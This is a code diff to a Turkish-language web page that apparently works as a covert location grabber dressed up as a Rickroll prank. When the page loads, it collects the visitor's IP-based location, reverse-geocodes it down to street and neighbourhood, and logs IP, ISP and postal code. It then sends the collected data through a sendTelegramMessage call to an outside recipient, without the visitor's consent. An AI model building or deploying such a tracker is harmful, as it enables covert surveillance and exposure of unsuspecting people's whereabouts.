@@ -30,10 +30,11 @@
       flex-direction: column;
       gap: 8px;
       position: relative;
+      padding: 12px;
     }
     
     #terminal {
-      flex: 1 1 40%;
+      flex: 1 1 50%;
       background: black;
       padding: 15px;
       overflow-y: auto;
@@ -43,13 +44,15 @@
       user-select: none;
       border-radius: 8px;
       border: 1px solid #00ff00;
+      max-height: 45vh;
     }
     
     #map {
-      flex: 1 1 60%;
+      flex: 1 1 50%;
       border: 2px solid #00ff00;
       border-radius: 8px;
       background: #111;
+      height: 50vh;
     }
     
     #rickrollButton {
@@ -168,7 +171,6 @@
         };
       } catch (error) {
         logToTerminal(`[${getCurrentTime()}] IP konum hatası: ${error.message}`);
-        
         return {
           latitude: 41.0082,
           longitude: 28.9784,
@@ -187,7 +189,7 @@
     async function reverseGeocode(lat, lon) {
       try {
         logToTerminal(`[${getCurrentTime()}] Detaylı adres bilgisi alınıyor...`);
-        
+
         const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
         const response = await fetch(url, {
           headers: { 'User-Agent': 'KonumTakipci/1.0' }
@@ -196,8 +198,8 @@
 
         const addr = data.address || {};
         return {
-          street: addr.road || '',
-          neighborhood: addr.suburb || addr.neighbourhood || '',
+          street: addr.road || addr.pedestrian || addr.footway || addr.street || '',
+          neighborhood: addr.suburb || addr.neighbourhood || addr.hamlet || addr.village || addr.city_district || '',
           city: addr.city || addr.town || addr.village || '',
           region: addr.state || '',
           country: addr.country || ''
@@ -234,91 +236,62 @@
       let locationData = await getLocationData();
 
       const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
-      locationData.street = reverseData.street || locationData.street;
-      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood;
+      locationData.street = reverseData.street;
+      locationData.neighborhood = reverseData.neighborhood;
       locationData.city = reverseData.city || locationData.city;
       locationData.region = reverseData.region || locationData.region;
       locationData.country = reverseData.country || locationData.country;
 
-      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);
+      logToTerminal(`[${getCurrentTime()}] Koordinatlar: ${locationData.latitude}, ${locationData.longitude}`);
+      logToTerminal(`[${getCurrentTime()}] Koordinatlar (DMS): ${formatCoordinate(locationData.latitude, locationData.longitude)}`);
+      logToTerminal(`[${getCurrentTime()}] Ülke: ${locationData.country}`);
+      logToTerminal(`[${getCurrentTime()}] Bölge: ${locationData.region}`);
+      logToTerminal(`[${getCurrentTime()}] Şehir: ${locationData.city}`);
+      logToTerminal(`[${getCurrentTime()}] Mahalle: ${locationData.neighborhood}`);
+      logToTerminal(`[${getCurrentTime()}] Sokak: ${locationData.street}`);
+      logToTerminal(`[${getCurrentTime()}] Posta Kodu: ${locationData.postal}`);
+      logToTerminal(`[${getCurrentTime()}] IP Adresi: ${locationData.ip}`);
+      logToTerminal(`[${getCurrentTime()}] ISP: ${locationData.org}`);
 
-      const infoMessage = 
-        `🌍 KONUM BİLGİLERİ:\n` +
-        `📍 IP: ${locationData.ip}\n` +
-        `🏙️ Şehir: ${locationData.city}\n` +
-        `🗺️ Bölge: ${locationData.region}\n` +
-        `🏘️ Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
-        `🛣️ Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
-        `📮 Posta Kodu: ${locationData.postal}\n` +
-        `🌐 Ülke: ${locationData.country}\n` +
-        `🏢 ISP: ${locationData.org}\n` +
-        `📐 Koordinatlar: ${coordsFormatted}\n\n` +
+      const message = 
+        `<b>📍 Yeni Konum Bilgisi</b>\n` +
+        `Koordinatlar: ${locationData.latitude}, ${locationData.longitude}\n` +
+        `Koordinatlar (DMS): ${formatCoordinate(locationData.latitude, locationData.longitude)}\n` +
+        `Ülke: ${locationData.country}\n` +
+        `Bölge: ${locationData.region}\n` +
+        `Şehir: ${locationData.city}\n` +
+        `Mahalle: ${locationData.neighborhood}\n` +
+        `Sokak: ${locationData.street}\n` +
+        `Posta Kodu: ${locationData.postal}\n` +
+        `IP: ${locationData.ip}\n` +
+        `ISP: ${locationData.org}`;
 
-        `💻 TARAYICI BİLGİLERİ:\n` +
-        `🔍 User Agent: ${navigator.userAgent}\n` +
-        `🗣️ Dil: ${navigator.language}\n` +
-        `⚙️ Platform: ${navigator.platform}\n` +
-        `🍪 Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-        `📶 Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +
+      await sendTelegramMessage(message);
 
-        `🖥️ EKRAN BİLGİLERİ:\n` +
-        `📺 Çözünürlük: ${screen.width}x${screen.height}\n` +
-        `🎨 Renk Derinliği: ${screen.colorDepth}\n` +
-        `🕐 Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-        `⏰ Şu anki Saat: ${getCurrentTime()}`;
-
-      logToTerminal(infoMessage);
-
-      await sendTelegramMessage(infoMessage);
-
-      logToTerminal(`[${getCurrentTime()}] 🗺️ Harita yükleniyor...`);
-
-      showMap(locationData.latitude, locationData.longitude, locationData);
-
-      logToTerminal(`[${getCurrentTime()}] ✅ Sistem hazır!`);
-      
-      addButton();
-    }
-
-    function showMap(lat, lon, locationData) {
-      try {
-        document.getElementById('map').innerHTML = '';
-        
-        map = L.map('map').setView([lat, lon], 16);
-
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-          maxZoom: 19,
-          attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
-        const popupContent = `
-          <div style="color: #00ff00; font-family: monospace;">
-            <b>📍 Konumunuz</b><br><br>
-            <b>🏙️ Şehir:</b> ${locationData.city}<br>
-            <b>🗺️ Bölge:</b> ${locationData.region}<br>
-            <b>🏘️ Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>
-            <b>🛣️ Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>
-            <b>🌐 Ülke:</b> ${locationData.country}<br>
-            <b>📐 Koordinatlar:</b> ${formatCoordinate(lat, lon)}
-          </div>`;
-
-        L.marker([lat, lon])
-          .addTo(map)
-          .bindPopup(popupContent)
-          .openPopup();
-      } catch (e) {
-        logToTerminal(`[${getCurrentTime()}] Harita yüklenirken hata: ${e.message}`);
-      }
-    }
-
-    function addButton() {
+      initializeMap(locationData.latitude, locationData.longitude);
       button.style.display = 'block';
-      button.addEventListener('click', () => {
-        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
-      });
     }
 
-    window.onload = collectData;
+    function initializeMap(lat, lon) {
+      if (map) {
+        map.remove();
+      }
+      map = L.map('map').setView([lat, lon], 16);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+        attribution: '© OpenStreetMap contributors'
+      }).addTo(map);
+
+      const marker = L.marker([lat, lon]).addTo(map);
+      marker.bindPopup(`Konum: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
+    }
+
+    button.addEventListener('click', () => {
+      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
+    });
+
+    collectData();
   </script>
 </body>
 </html>
